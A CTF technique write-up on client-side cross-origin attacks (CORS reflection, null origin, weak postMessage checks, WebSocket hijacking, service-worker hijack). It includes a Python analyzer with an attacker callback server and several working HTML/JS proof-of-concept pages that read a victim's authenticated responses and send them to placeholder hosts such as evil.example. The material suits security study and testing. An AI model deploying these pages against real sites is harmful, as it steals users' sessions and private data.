---
title: "Client-Side Cross-Origin - CORS, postMessage, WebSocket Hijacking and Service Workers"
category: web
subcategory: client-side
type: technique
tags: [cors, postmessage, websocket, cswsh, service-worker, same-origin-policy, allow-credentials, null-origin, origin-reflection, dom-xss, credential-theft, exfiltration, burp, dom-invader]
difficulty: medium
summary: "Reflected Origin + Allow-Credentials reads cross-origin data; weak postMessage origin checks and unvalidated WebSocket Origins (CSWSH) leak sessions; a wide-scope service worker hijacks fetch."
when_to_use:
  - "A response reflects the Origin header and sets Access-Control-Allow-Credentials: true"
  - "A page has a postMessage listener with a weak or missing origin check"
  - "A WebSocket authenticates by cookie and does not validate Origin (CSWSH)"
  - "You have XSS on an origin and want persistence, or can upload a JS file with wide scope"
tools: [burp, dom-invader, python3, wsrepl]
related: [proto-pollution, node-parameter-pollution, race-xsleaks, graphql-attacks]
---

## TL;DR

The Same-Origin Policy blocks cross-origin *reads*, but misconfigurations open holes: a server
that reflects `Origin` and sends `Allow-Credentials: true` lets any site read authenticated
responses; a `postMessage` listener with a sloppy origin check accepts attacker messages; a
WebSocket that authenticates by cookie and ignores `Origin` is fully hijackable (CSWSH); a
service worker registered via XSS intercepts every fetch on the origin.

## Recognise it

- Response headers: `Access-Control-Allow-Origin` echoing your `Origin`, plus
  `Access-Control-Allow-Credentials: true`. Or `Access-Control-Allow-Origin: null`.
- JS: `window.addEventListener('message', ...)` without an exact `event.origin` check, or with
  `indexOf`/`startsWith`/`endsWith`.
- `new WebSocket('wss://...')` where auth is a cookie and the handshake has no CSRF token /
  Origin check.
- `navigator.serviceWorker.register(...)`, a reachable `sw.js`, or a JS-file upload + a
  `Service-Worker-Allowed` header.

## Theory

### CORS

The rules that create the bug:

- `Access-Control-Allow-Origin: *` **cannot** be combined with credentials -- the browser
  refuses. So a server wanting credentialed CORS must *reflect* the requesting origin. If it
  reflects *without validating*, any origin qualifies.
- `Access-Control-Allow-Credentials: true` + reflected `Origin` = attacker page reads the
  victim's authenticated response.
- `Access-Control-Allow-Origin: null` is trusted by some servers; a sandboxed iframe
  (`<iframe sandbox="allow-scripts" srcdoc=...>`) has origin `null`, so it qualifies.

Origin-validation bugs (regex mistakes):

| Intended allowlist | Attacker origin that matches | Bug |
| --- | --- | --- |
| `example.com` (substring) | `example.com.evil.com` | unanchored / prefix |
| `example.com` (substring) | `evilexample.com` | unanchored / suffix |
| `.*\.example\.com` unescaped dot | `wwwXexample.com` | `.` not escaped |
| endsWith(`example.com`) | `notexample.com` | suffix match |
| trusted subdomain | `sub.example.com` with an XSS | subdomain trust + XSS |

Preflight: a request is "simple" (no preflight) if method is GET/HEAD/POST and Content-Type is
`text/plain`, `application/x-www-form-urlencoded` or `multipart/form-data` with only
CORS-safelisted headers. Simple requests are *sent* even without CORS permission; only the
*read* is gated -- which is why credentialed exfil works with a simple GET.

### postMessage

`postMessage(data, targetOrigin)` and the receiver's `event.origin` are the two checkpoints:

- **Receiver with no/weak origin check** trusts attacker data:
  `if (e.origin.indexOf('example.com') !== -1)` matches `example.com.evil.com`;
  `endsWith('example.com')` matches `notexample.com`; `startsWith('https://example.com')`
  matches `https://example.com.evil.com`.
- **Sender with `targetOrigin: "*"`** leaks the message to whoever currently frames/opened the
  window -- navigate the frame to your origin and receive secrets.
- If the receiver does `element.innerHTML = e.data` or `eval(e.data)` -> DOM XSS.

### WebSockets (CSWSH)

WebSockets have **no Same-Origin Policy** and the handshake is an HTTP request that **sends
cookies**. If the server authenticates the socket by cookie and does not validate `Origin` (nor
require a CSRF token in the handshake), an attacker page can open the socket *as the victim*:

```js
const ws = new WebSocket('wss://target/chat');   // victim's cookies ride along
ws.onmessage = e => fetch('https://evil/x?d=' + btoa(e.data));  // exfil
ws.onopen = () => ws.send('{"cmd":"getSecrets"}');              // act as victim
```

Also: missing per-message authorization (send another user's id), and token smuggling via
`Sec-WebSocket-Protocol`.

### Service workers

A registered SW sits between the page and the network and can intercept every `fetch` within
its **scope**. In CTF:

- XSS on the origin -> `navigator.serviceWorker.register('/sw.js')` for *persistence* (the SW
  survives navigation and can re-inject).
- Upload a JS file that the app serves from the root, register it as a SW, and its scope covers
  the whole origin. `Service-Worker-Allowed: /` widens scope beyond the script's path.
- The SW's `fetch` handler reads responses (including authenticated ones) and exfiltrates.

## Attack

1. **CORS**: set `Origin: https://evil.com`, check the response `ACAO`/`ACAC`. Try `null` from
   a sandboxed iframe, and the regex-bypass origins. Confirm with a real credentialed read.
2. **postMessage**: enumerate listeners (DOM Invader), send messages from an attacker frame,
   test weak origin checks and DOM sinks.
3. **WebSocket**: open the socket from an attacker origin, see if it authenticates; if so,
   read/inject messages as the victim.
4. **Service worker**: with XSS or a JS upload, register a SW with the widest scope and
   intercept fetches.

## Code

```python
#!/usr/bin/env python3
"""CORS misconfiguration analyzer + attacker-page server.

`analyze()` is a pure function (offline-testable): given the Origin sent and
the response headers, it returns a verdict. `serve()` starts a small HTTP
server that hands out a templated PoC page.
"""
from __future__ import annotations

import http.server
import sys
import threading
import urllib.parse


def analyze(sent_origin: str, resp_headers: dict[str, str]) -> str:
    """Verdict for one CORS probe. Header names are matched case-insensitively."""
    h = {k.lower(): v for k, v in resp_headers.items()}
    acao = h.get("access-control-allow-origin")
    acac = (h.get("access-control-allow-credentials", "")).lower() == "true"

    if acao is None:
        return "safe:no-cors"
    if acao == "*":
        # wildcard cannot carry credentials; only a data-leak if the data is public
        return "info:wildcard-no-creds" if not acac else "invalid:wildcard+creds"
    if acao == "null":
        return "vulnerable:null-origin" if acac else "weak:null-no-creds"
    if acao == sent_origin:
        # the server reflected whatever we sent
        if acac:
            return "vulnerable:reflected+creds"
        return "weak:reflected-no-creds"
    # a fixed, non-reflected origin -- check for classic regex mistakes
    if sent_origin and acao != sent_origin:
        return "safe:fixed-origin"
    return "safe:unknown"


def origin_bypass_candidates(base_domain: str) -> list[str]:
    """Origins to try against a naive allowlist for base_domain."""
    return [
        "https://%s.evil.com" % base_domain,        # prefix / unanchored
        "https://evil%s" % base_domain,             # suffix / unanchored
        "https://%s.evil.com" % base_domain.replace(".", "x"),  # unescaped dot
        "https://not%s" % base_domain,              # endsWith bypass
        "https://%s" % base_domain,                 # exact (sanity)
        "null",                                     # sandboxed iframe
        "https://sub.%s" % base_domain,             # trusted subdomain (needs XSS)
    ]


POC_CORS = """<!doctype html><script>
fetch("{target}", {{credentials:"include"}})
  .then(r => r.text())
  .then(d => fetch("{callback}?d=" + encodeURIComponent(btoa(d))));
</script>"""

POC_CSWSH = """<!doctype html><script>
var ws = new WebSocket("{ws}");
ws.onopen = () => ws.send({open_msg});
ws.onmessage = e => fetch("{callback}?d=" + encodeURIComponent(btoa(e.data)));
</script>"""


def build_cors_poc(target: str, callback: str) -> str:
    return POC_CORS.format(target=target, callback=callback)


def build_cswsh_poc(ws_url: str, callback: str, open_msg: str = '""') -> str:
    return POC_CSWSH.format(ws=ws_url, callback=callback, open_msg=open_msg)


class _Handler(http.server.BaseHTTPRequestHandler):
    page = b""
    hits: list[str] = []

    def do_GET(self):  # noqa: N802
        if self.path.startswith("/cb"):
            _Handler.hits.append(self.path)
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"ok")
            return
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.end_headers()
        self.wfile.write(_Handler.page)

    def log_message(self, *a):  # silence
        pass


def serve(page: str, host: str = "127.0.0.1", port: int = 0
          ) -> tuple[http.server.HTTPServer, int]:
    _Handler.page = page.encode()
    srv = http.server.HTTPServer((host, port), _Handler)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    return srv, srv.server_address[1]


def _self_test() -> None:
    # reflected + creds is the money bug
    assert analyze("https://evil.com", {
        "Access-Control-Allow-Origin": "https://evil.com",
        "Access-Control-Allow-Credentials": "true"}) == "vulnerable:reflected+creds"
    # reflected but no creds -> weak
    assert analyze("https://evil.com", {
        "Access-Control-Allow-Origin": "https://evil.com"}) == \
        "weak:reflected-no-creds"
    # null origin trusted with creds
    assert analyze("null", {
        "Access-Control-Allow-Origin": "null",
        "access-control-allow-credentials": "true"}) == "vulnerable:null-origin"
    # wildcard cannot carry creds
    assert analyze("https://evil.com", {
        "Access-Control-Allow-Origin": "*"}) == "info:wildcard-no-creds"
    assert analyze("https://evil.com", {
        "Access-Control-Allow-Origin": "*",
        "Access-Control-Allow-Credentials": "true"}) == "invalid:wildcard+creds"
    # fixed origin, not reflected -> safe
    assert analyze("https://evil.com", {
        "Access-Control-Allow-Origin": "https://app.example.com"}) == \
        "safe:fixed-origin"
    # no CORS headers
    assert analyze("https://evil.com", {}) == "safe:no-cors"
    # case-insensitive header match
    assert analyze("https://e", {"ACCESS-CONTROL-ALLOW-ORIGIN": "https://e",
                                 "ACCESS-CONTROL-ALLOW-CREDENTIALS": "TRUE"}) == \
        "vulnerable:reflected+creds"

    # bypass candidate list
    cands = origin_bypass_candidates("example.com")
    assert "null" in cands
    assert any("example.com.evil.com" in c for c in cands)
    assert any(c == "https://notexample.com" for c in cands)

    # PoC templating
    poc = build_cors_poc("https://target/api/me", "https://evil/cb")
    assert 'credentials:"include"' in poc and "https://target/api/me" in poc
    ws = build_cswsh_poc("wss://target/ws", "https://evil/cb", '"{\\"x\\":1}"')
    assert "new WebSocket" in ws and "wss://target/ws" in ws

    # the attacker server actually serves the page and logs a callback hit
    srv, port = serve(poc)
    try:
        import urllib.request
        got = urllib.request.urlopen("http://127.0.0.1:%d/" % port,
                                     timeout=5).read().decode()
        assert "https://target/api/me" in got
        urllib.request.urlopen(
            "http://127.0.0.1:%d/cb?d=%s" % (port, urllib.parse.quote("AA==")),
            timeout=5).read()
        assert any(hit.startswith("/cb") for hit in _Handler.hits)
    finally:
        srv.shutdown()

    print("[ok] CORS analyzer (8 verdicts), bypass list, PoC templates, "
          "and attacker server verified")


if __name__ == "__main__":
    if len(sys.argv) > 1:
        print(build_cors_poc(sys.argv[1],
                             sys.argv[2] if len(sys.argv) > 2 else "https://evil/cb"))
    else:
        _self_test()
```

CORS credentialed-read exfil (drop on your origin):

```html
<!doctype html>
<script>
fetch("https://target.example/api/account", {credentials: "include"})
  .then(r => r.text())
  .then(d => new Image().src = "https://evil.example/log?d=" + btoa(d));
</script>
```

Null-origin variant (sandboxed iframe):

```html
<iframe sandbox="allow-scripts" srcdoc='
  <script>
    fetch("https://target.example/api/account",{credentials:"include"})
      .then(r=>r.text()).then(d=>top.location="https://evil/?"+btoa(d));
  &lt;/script&gt;'></iframe>
```

Weak postMessage listener abuse:

```html
<!-- attacker page opens the target then messages it -->
<script>
const w = window.open("https://target.example/widget");
setTimeout(() => w.postMessage({type:"setConfig", html:"<img src onerror=alert(document.domain)>"}, "*"), 1500);
// works if the target's listener does e.origin.indexOf('target.example')!==-1
// and then element.innerHTML = e.data.html
</script>
```

CSWSH page:

```html
<!doctype html>
<script>
const ws = new WebSocket("wss://target.example/socket");   // sends victim cookies
ws.onopen = () => ws.send('{"action":"listMessages"}');
ws.onmessage = e => navigator.sendBeacon("https://evil/x", e.data);
</script>
```

Service-worker fetch hijack (after XSS or JS upload):

```html
<script>
navigator.serviceWorker.register("/uploads/sw.js", {scope: "/"});
</script>
```

```javascript
// sw.js (needs Service-Worker-Allowed: / if served from /uploads/)
self.addEventListener("fetch", e => {
  e.respondWith(fetch(e.request).then(async r => {
    const clone = r.clone();
    navigator.sendBeacon("https://evil/log", await clone.text());
    return r;
  }));
});
```

## Variants & pitfalls

- **`*` with credentials is impossible** -- if you see it, the read will be blocked; look for
  reflection instead.
- **CORS read needs `Allow-Credentials: true`** for *authenticated* data; without it you can
  still read public data cross-origin, which is rarely the flag.
- **`null` origin sources**: sandboxed iframes, `data:` URLs, `file://`, redirects, and some
  privacy modes. A sandboxed `srcdoc` iframe is the reliable CTF source.
- **postMessage `targetOrigin: "*"`** is a leak on the *sender* side; a weak `event.origin`
  check is a bug on the *receiver* side -- they are different vulnerabilities.
- **CSWSH proof**: you must show reading/acting as the victim, not just that the socket opens.
  Some servers re-check auth per message.
- **Service worker scope** is limited to the script's path unless `Service-Worker-Allowed`
  widens it; an upload dir usually restricts scope to that dir.
- **HTTPS required** for service workers (except `localhost`).
- **SameSite cookies** blunt CORS/CSWSH: `Lax`/`Strict` cookies are not sent on cross-site
  subresource requests, so credentialed exfil fails unless the cookie is `SameSite=None` (or the
  attack is same-site). Check the `Set-Cookie` attributes first.
- **COOP/COEP/CORP** break `window.opener`, cross-origin popups and embedding -- they defeat
  several of these when set.

## Tools

- Burp -- change `Origin`, read `Access-Control-*`; the CORS scanner in the scanner engine.
- Burp DOM Invader -- postMessage source/sink enumeration and web-message testing.
- `wsrepl` / Burp's WebSocket history + repeater -- CSWSH testing.
- The analyzer above for triaging captured response headers offline.

## References

- PortSwigger Web Security Academy -- CORS, WebSockets (CSWSH), DOM-based vulnerabilities.
- MDN -- CORS, Same-Origin Policy, `Window.postMessage`, Service Worker API.
- OWASP -- Testing Cross Origin Resource Sharing.
